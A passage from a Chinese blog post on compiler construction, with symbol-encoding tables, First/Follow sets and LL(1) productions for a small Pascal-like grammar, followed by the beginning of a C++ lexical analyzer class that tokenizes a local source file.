&lt;标识符&gt;</span><br><span class="line">&lt;常数&gt; -&gt; &lt;整数&gt; | &lt;浮点数&gt;</span><br><span class="line">&lt;关系符&gt; -&gt; &lt; | &lt;= | = | &gt; | &gt;= | &lt;&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>符号的机内表示：将推导式中的字母（1位字母过于有限）替换为数字来标记类型。（为了表示方便，展示推导式时仍保留字母）。将VN从100开始编号：</p>
<table>
<thead>
<tr>
<th align="center">VN</th>
<th align="center">Str</th>
<th>int</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;程序&gt;</td>
<td align="center">A</td>
<td>100</td>
</tr>
<tr>
<td align="center">&lt;分程序&gt;</td>
<td align="center">B</td>
<td>101</td>
</tr>
<tr>
<td align="center">&lt;变量说明&gt;</td>
<td align="center">C</td>
<td>102</td>
</tr>
<tr>
<td align="center">&lt;变量说明表&gt;</td>
<td align="center">D</td>
<td>103</td>
</tr>
<tr>
<td align="center">&lt;类型&gt;</td>
<td align="center">E</td>
<td>104</td>
</tr>
<tr>
<td align="center">&lt;变量表&gt;</td>
<td align="center">F</td>
<td>105</td>
</tr>
<tr>
<td align="center">&lt;语句表&gt;</td>
<td align="center">G</td>
<td>106</td>
</tr>
<tr>
<td align="center">&lt;语句&gt;</td>
<td align="center">H</td>
<td>107</td>
</tr>
<tr>
<td align="center">&lt;赋值语句&gt;</td>
<td align="center">I</td>
<td>108</td>
</tr>
<tr>
<td align="center">&lt;条件语句&gt;</td>
<td align="center">J</td>
<td>109</td>
</tr>
<tr>
<td align="center">&lt;WHILE语句&gt;</td>
<td align="center">K</td>
<td>110</td>
</tr>
<tr>
<td align="center">&lt;复合语句&gt;</td>
<td align="center">L</td>
<td>111</td>
</tr>
<tr>
<td align="center">&lt;算术表达式&gt;</td>
<td align="center">M</td>
<td>112</td>
</tr>
<tr>
<td align="center">&lt;替算术表达式&gt;</td>
<td align="center">N</td>
<td>113</td>
</tr>
<tr>
<td align="center">&lt;另算术表达式&gt;</td>
<td align="center">O</td>
<td>114</td>
</tr>
<tr>
<td align="center">&lt;后算术表达式&gt;</td>
<td align="center">P</td>
<td>115</td>
</tr>
<tr>
<td align="center">&lt;项&gt;</td>
<td align="center">Q</td>
<td>116</td>
</tr>
<tr>
<td align="center">&lt;另项&gt;</td>
<td align="center">R</td>
<td>117</td>
</tr>
<tr>
<td align="center">&lt;后项&gt;</td>
<td align="center">S</td>
<td>118</td>
</tr>
<tr>
<td align="center">&lt;因式&gt;</td>
<td align="center">T</td>
<td>119</td>
</tr>
<tr>
<td align="center">&lt;关系表达式&gt;</td>
<td align="center">U</td>
<td>120</td>
</tr>
<tr>
<td align="center">&lt;变量&gt;</td>
<td align="center">V</td>
<td>121</td>
</tr>
<tr>
<td align="center">&lt;常数&gt;</td>
<td align="center">W</td>
<td>122</td>
</tr>
<tr>
<td align="center">&lt;关系符&gt;</td>
<td align="center">X</td>
<td>123</td>
</tr>
<tr>
<td align="center">&lt;后变量说明表&gt;</td>
<td align="center">Y</td>
<td>124</td>
</tr>
<tr>
<td align="center">&lt;后变量表&gt;</td>
<td align="center">Z</td>
<td>125</td>
</tr>
<tr>
<td align="center">&lt;后语句表&gt;</td>
<td align="center">A<del>1</del></td>
<td>126</td>
</tr>
<tr>
<td align="center">&lt;替项&gt;</td>
<td align="center">B<del>1</del></td>
<td>127</td>
</tr>
<tr>
<td align="center">&lt;空&gt;</td>
<td align="center">C<del>1</del></td>
<td>128</td>
</tr>
</tbody></table>
<p>列出VT（不考虑 <code>&amp;&amp;</code> 、<code>||</code> 、<code>until</code> 、<code>for</code> 、<code>repeat</code> 、<code>!</code> ）：</p>
<table>
<thead>
<tr>
<th align="center">VT</th>
<th align="center">STR</th>
<th align="center">INt</th>
</tr>
</thead>
<tbody><tr>
<td align="center">program</td>
<td align="center">a</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">var</td>
<td align="center">b</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">integer</td>
<td align="center">c</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">real</td>
<td align="center">d</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">begin</td>
<td align="center">e</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">end</td>
<td align="center">f</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">if</td>
<td align="center">g</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">then</td>
<td align="center">h</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">else</td>
<td align="center">i</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">while</td>
<td align="center">j</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">do</td>
<td align="center">k</td>
<td align="center">10</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">l</td>
<td align="center">20</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">m</td>
<td align="center">21</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">n</td>
<td align="center">22</td>
</tr>
<tr>
<td align="center">&#x2F;</td>
<td align="center">o</td>
<td align="center">23</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">p</td>
<td align="center">24</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">q</td>
<td align="center">25</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">r</td>
<td align="center">26</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">s</td>
<td align="center">27</td>
</tr>
<tr>
<td align="center">&#x3D;</td>
<td align="center">t</td>
<td align="center">28</td>
</tr>
<tr>
<td align="center">&lt;&gt;</td>
<td align="center">u</td>
<td align="center">29</td>
</tr>
<tr>
<td align="center">:&#x3D;</td>
<td align="center">v</td>
<td align="center">30</td>
</tr>
<tr>
<td align="center">&lt;整数&gt;</td>
<td align="center">w</td>
<td align="center">40</td>
</tr>
<tr>
<td align="center">&lt;浮点数&gt;</td>
<td align="center">x</td>
<td align="center">41</td>
</tr>
<tr>
<td align="center">&lt;标识符&gt;</td>
<td align="center">y</td>
<td align="center">44</td>
</tr>
<tr>
<td align="center">;</td>
<td align="center">z</td>
<td align="center">50</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">a<del>1</del></td>
<td align="center">51</td>
</tr>
<tr>
<td align="center">,</td>
<td align="center">b<del>1</del></td>
<td align="center">52</td>
</tr>
<tr>
<td align="center">:</td>
<td align="center">c<del>1</del></td>
<td align="center">53</td>
</tr>
<tr>
<td align="center">(</td>
<td align="center">d<del>1</del></td>
<td align="center">54</td>
</tr>
<tr>
<td align="center">)</td>
<td align="center">e<del>1</del></td>
<td align="center">55</td>
</tr>
</tbody></table>
</li>
<li><p>First集与Follow集：</p>
<table>
<thead>
<tr>
<th align="center">VN</th>
<th align="center">产生式</th>
<th align="center">First</th>
<th align="center">follow</th>
<th align="center">产生式（入栈数字）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">A</td>
<td align="center">A-&gt;ayzB</td>
<td align="center">a</td>
<td align="center">#</td>
<td align="center">101, 50, 44, 0</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">B-&gt;CeGfa<del>1</del></td>
<td align="center">b</td>
<td align="center">#</td>
<td align="center">51, 5, 106, 4, 102</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">C-&gt;bD</td>
<td align="center">b</td>
<td align="center">e</td>
<td align="center">103, 1</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">D-&gt;Fc<del>1</del>EzY</td>
<td align="center">y</td>
<td align="center">e</td>
<td align="center">124, 50, 104, 53, 105</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="center">Y-&gt;D</td>
<td align="center">y</td>
<td align="center">e</td>
<td align="center">103</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Y-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">E</td>
<td align="center">E-&gt;c</td>
<td align="center">c</td>
<td align="center">z</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">E-&gt;d</td>
<td align="center">d</td>
<td align="center"></td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">F-&gt;VZ</td>
<td align="center">y</td>
<td align="center">c<del>1</del></td>
<td align="center">125, 121</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">Z-&gt;b<del>1</del>F</td>
<td align="center">b<del>1</del></td>
<td align="center">c<del>1</del></td>
<td align="center">105, 52</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Z-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">G</td>
<td align="center">G-&gt;HA<del>1</del></td>
<td align="center">y,g,j,e</td>
<td align="center">f</td>
<td align="center">126, 107</td>
</tr>
<tr>
<td align="center">A<del>1</del></td>
<td align="center">A<del>1</del>-&gt;zG</td>
<td align="center">z</td>
<td align="center">f</td>
<td align="center">106, 50</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">A<del>1</del>-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">H</td>
<td align="center">H-&gt;I</td>
<td align="center">y</td>
<td align="center">z, f, i</td>
<td align="center">108</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">H-&gt;J</td>
<td align="center">g</td>
<td align="center"></td>
<td align="center">109</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">H-&gt;K</td>
<td align="center">j</td>
<td align="center"></td>
<td align="center">110</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">H-&gt;L</td>
<td align="center">e</td>
<td align="center"></td>
<td align="center">111</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">I-&gt;VvM</td>
<td align="center">y</td>
<td align="center">z, f, i</td>
<td align="center">112, 30, 121</td>
</tr>
<tr>
<td align="center">J</td>
<td align="center">J-&gt;gUhHiH</td>
<td align="center">g</td>
<td align="center">z, f, i</td>
<td align="center">107, 8, 107, 7, 120, 6</td>
</tr>
<tr>
<td align="center">K</td>
<td align="center">K-&gt;jUkH</td>
<td align="center">j</td>
<td align="center">z, f, i</td>
<td align="center">107, 10, 120, 9</td>
</tr>
<tr>
<td align="center">L</td>
<td align="center">L-&gt;eGf</td>
<td align="center">e</td>
<td align="center">z, f, i</td>
<td align="center">5, 106, 4</td>
</tr>
<tr>
<td align="center">M</td>
<td align="center">M-&gt;QN</td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">113, 116</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">N-&gt;O</td>
<td align="center">l,m</td>
<td align="center">z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">114</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">N-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">O</td>
<td align="center">O-&gt;PO</td>
<td align="center">l,m</td>
<td align="center">z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">114, 115</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">O-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">P</td>
<td align="center">P-&gt;lQ</td>
<td align="center">l</td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">116, 20</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">P-&gt;mQ</td>
<td align="center">m</td>
<td align="center"></td>
<td align="center">116, 21</td>
</tr>
<tr>
<td align="center">Q</td>
<td align="center">Q-&gt;TB<del>1</del></td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">127, 119</td>
</tr>
<tr>
<td align="center">B<del>1</del></td>
<td align="center">B<del>1</del>-&gt;R</td>
<td align="center">n,o</td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">117</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">B<del>1</del>-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">R-&gt;SR</td>
<td align="center">n,o</td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">117, 118</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">R-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">S-&gt;nT</td>
<td align="center">n</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">119, 22</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">S-&gt;oT</td>
<td align="center">o</td>
<td align="center"></td>
<td align="center">119, 23</td>
</tr>
<tr>
<td align="center">T</td>
<td align="center">T-&gt;V</td>
<td align="center">y</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">121</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">T-&gt;W</td>
<td align="center">w,x</td>
<td align="center"></td>
<td align="center">122</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">T-&gt;d<del>1</del>Me<del>1</del></td>
<td align="center">d<del>1</del></td>
<td align="center"></td>
<td align="center">55, 112, 54</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">U-&gt;MXM</td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">k, h</td>
<td align="center">112, 123, 112</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">V-&gt;y</td>
<td align="center">y</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, v, b<del>1</del>, c<del>1</del>, h, k, e<del>1</del></td>
<td align="center">44</td>
</tr>
<tr>
<td align="center">W</td>
<td align="center">W-&gt;w</td>
<td align="center">w</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del></td>
<td align="center">40</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">W-&gt;x</td>
<td align="center">x</td>
<td align="center"></td>
<td align="center">41</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">X-&gt;p</td>
<td align="center">p</td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">24</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;q</td>
<td align="center">q</td>
<td align="center"></td>
<td align="center">25</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;r</td>
<td align="center">r</td>
<td align="center"></td>
<td align="center">26</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;s</td>
<td align="center">s</td>
<td align="center"></td>
<td align="center">27</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;t</td>
<td align="center">t</td>
<td align="center"></td>
<td align="center">28</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;u</td>
<td align="center">u</td>
<td align="center"></td>
<td align="center">29</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
</li>
</ol>
<h4 id="预测表"><a href="#预测表" class="headerlink" title="预测表"></a>预测表</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.file.myqcloud.com/image-20230416145626058.png"
                      alt="image-20230416145626058"
                ></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idMax 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> keyWordsLen 14</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">wordsAnalyzer</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">char</span> wd;            <span class="comment">// 读取字符</span></span><br><span class="line">        <span class="type">int</span> silence;        <span class="comment">// 是否需要输出</span></span><br><span class="line">        <span class="type">int</span> len, status;    <span class="comment">// 缓存长度与自动机状态</span></span><br><span class="line">        <span class="type">int</span> flag;           <span class="comment">// 标记分析器是否正常</span></span><br><span class="line">        <span class="type">int</span> wordsLen;       <span class="comment">// 词元数量</span></span><br><span class="line">        <span class="type">int</span> type;           <span class="comment">// 种别归类: 0-关键字 1-运算符 2-常数 3-界符 4-标识符 5-注释串</span></span><br><span class="line">        <span class="type">int</span> cag;         <span class="comment">// 种别码, 保持为可查表位序+1</span></span><br><span class="line">        <span class="type">int</span> srcLen;     <span class="comment">// 源码长度</span></span><br><span class="line">        <span class="type">int</span> needOF;     <span class="comment">// 是否需要保存至文件</span></span><br><span class="line">        vector&lt;string&gt; strV;    <span class="comment">// 存储词元</span></span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; typeV;    <span class="comment">// 存储种别码</span></span><br><span class="line">        string words;       <span class="comment">// 缓存</span></span><br><span class="line">        string src;     <span class="comment">// 源码字符串</span></span><br><span class="line">        FILE *oF;    <span class="comment">// 结果保存文件，默认为fiP</span></span><br><span class="line">        string oFP;     <span class="comment">// 保存路径</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// 词元编码表</span></span><br><span class="line">        vector&lt;string&gt; wordsTable = &#123;</span><br><span class="line">            <span class="string">&quot;program&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;integer&quot;</span>, <span class="string">&quot;real&quot;</span>,            <span class="comment">// 0-3</span></span><br><span class="line">            <span class="string">&quot;begin&quot;</span>, <span class="string">&quot;end&quot;</span>, <span class="string">&quot;if&quot;</span>, <span class="string">&quot;then&quot;</span>,                   <span class="comment">// 4-7</span></span><br><span class="line">            <span class="string">&quot;else&quot;</span>, <span class="string">&quot;while&quot;</span>, <span class="string">&quot;do&quot;</span>, <span class="string">&quot;repeat&quot;</span>,                <span class="comment">// 8-11</span></span><br><span class="line">            <span class="string">&quot;until&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                   <span class="comment">// 12-15（跳过14, 15）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                     <span class="comment">// 16-19（全跳过）</span></span><br><span class="line">            <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>,                             <span class="comment">// 20-23</span></span><br><span class="line">            <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&gt;=&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&lt;=&quot;</span>,                           <span class="comment">// 24-27</span></span><br><span class="line">            <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&lt;&gt;&quot;</span>, <span class="string">&quot;:=&quot;</span>, <span class="string">&quot;&amp;&amp;&quot;</span>,                          <span class="comment">// 28-31</span></span><br><span class="line">            <span class="string">&quot;||&quot;</span>, <span class="string">&quot;!&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                        <span class="comment">// 32-35（跳过34, 35）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                     <span class="comment">// 36-39（全跳过）</span></span><br><span class="line">            <span class="string">&quot;integerConst&quot;</span>, <span class="string">&quot;doubleConst&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,    <span class="comment">// 40-43（跳过42, 43）</span></span><br><span class="line">            <span class="string">&quot;id&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>,                      <span class="comment">// 44-47（跳过45, 47）</span></span><br><span class="line">            <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;NaN&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;.&quot;</span>,                         <span class="comment">// 48-51（跳过48, 49）</span></span><br><span class="line">            <span class="string">&quot;,&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>,                             <span class="comment">// 52-55</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 空白字符</span></span><br><span class="line">        <span class="type">const</span> vector&lt;<span class="type">char</span>&gt; filt = &#123;<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">        <span class="comment">// 单字分隔符,不考虑冒号,点号</span></span><br><span class="line">        <span class="type">const</span> vector&lt;<span class="type">char</span>&gt; delm = &#123;<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">wordsAnalyzer</span>(<span class="type">int</span> sil=<span class="number">0</span>, string fiP = <span class="string">&quot;./test.txt&quot;</span>, string foP = <span class="string">&quot;./res.txt&quot;</span>)&#123;</span><br><span class="line">            silence = sil;  </span><br><span class="line">            flag = <span class="number">1</span>;               <span class="comment">// 分析器状态ok</span></span><br><span class="line">            words = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">            status = <span class="number">0</span>;     <span class="comment">// 自动机起点</span></span><br><span class="line">            wordsLen = <span class="number">0</span>;   <span class="comment">// 词元数量</span></span><br><span class="line">            oFP = foP;      <span class="comment">// 保存路径</span></span><br><span class="line">            ifstream ins;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(oFP!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                needOF = <span class="number">1</span>;</span><br><span class="line">                oF = <span class="built_in">fopen</span>(oFP.<span class="built_in">c_str</span>(), <span class="string">&quot;w&quot;</span>);    <span class="comment">// 覆盖式的写入</span></span><br><span class="line">                <span class="keyword">if</span>(oF==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Fail to write in the file: %s&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">                    <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">newPrintf</span>(<span class="string">&quot;Output file path: %s -&gt; Succeed!\n&quot;</span>, oFP.<span class="built_in">c_str</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> needOF = <span class="number">0</span>;    <span class="comment">// 不保存文件</span></span><br><span class="line">            ins.<span class="built_in">open</span>(fiP, ios::in);     <span class="comment">// 读入模式打开文件</span></span><br><span class="line">            <span class="keyword">if</span>(!ins.<span class="built_in">good</span>())&#123;    <span class="comment">// 检测文件是否正常打开</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Fail to open the file: %s&quot;</span>, fiP.<span class="built_in">c_str</span>());</span><br><span class="line">                <span class="keyword">this</span>-&gt;flag = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);       <span class="comment">// 出错, 终止程序</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;Input file path: %s -&gt; Succeed!\n&quot;</span>, fiP.<span class="built_in">c_str</span>());   <span class="comment">// 展示读取路径</span></span><br><span class="line">            <span class="built_in">printSplit</span>(<span class="string">&quot;Src&quot;</span>);  <span class="comment">// 分割线</span></span><br><span class="line">            </span><br><span class="line">            <span class="type">char</span> _ch;</span><br><span class="line">            src = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((_ch = ins.<span class="built_in">get</span>()) != EOF)&#123;    <span class="comment">// 存入源码串中</span></span><br><span class="line">                src += _ch;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            ins.<span class="built_in">close</span>();</span><br><span class="line">            src += <span class="string">&#x27;\0&#x27;</span>;    <span class="comment">// 添加终止符</span></span><br><span class="line">            srcLen = src.<span class="built_in">length</span>();  <span class="comment">// 源码串长度</span></span><br><span class="line">            <span class="built_in">newPrintf</span>(<span class="string">&quot;%s\n&quot;</span>, src.<span class="built_in">c_str</span>());    <span class="comment">// 展示源码</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ~<span class="built_in">wordsAnalyzer</span>()&#123;</span><br><span class="line">            <span class="built_in">fclose</span>(oF);     <span class="comment">// 关闭FILE文件流</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">analyze</span><span class="params">()</span></span>&#123;    <span class="comment">// 词法分析器</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;srcLen; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">447</span>)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i);</span><br><span class="line">                &#125;</span><br><span class="line">                wd = src[i];</span><br><span class="line">                <span class="keyword">switch</span>(status)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="number">0</span>:    <span class="comment">// 自动机起点，words为空</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">isBlank</span>()) <span class="built_in">blankContinue</span>();   <span class="comment">// 跳过空白字符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isLowerLetter</span>() || <span class="built_in">isUpperLetter</span>()) <span class="built_in">newStatus</span>(<span class="number">1</span>);   <span class="comment">// 转移状态-&gt;1 字母开头 大写字母可以用于区分标识符和关键字，但即使全是小写字母也需要单独检查，因此全是字母归为一类</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">isNumber</span>(<span class="number">0</span>)) <span class="built_in">newStatus</span>(<span class="number">2</span>);                          <span class="comment">// 转移状态-&gt;2 非零数字开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;0&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">3</span>);                            <span class="comment">// 转移状态-&gt;3  0开头</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&amp;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">4</span>);         <span class="comment">// 转移状态-&gt;4  多字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;|&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">5</span>);         <span class="comment">// 转移状态-&gt;5  </span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;:&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">6</span>);         <span class="comment">// 转移状态-&gt;6</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">7</span>);         <span class="comment">// 转移状态-&gt;7</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;&lt;&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">8</span>);         <span class="comment">// 转移状态-&gt;8</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;/&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">9</span>);         <span class="comment">// 转移状态-&gt;9</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;*&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">10</span>);        <span class="comment">// 状态转移-&gt;10 单字运算符</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span>(wd == <span class="string">&#x27;=&#x27;</span>) <span class="built_in">newStatus</span>(<span class="number">11</span>);        <span 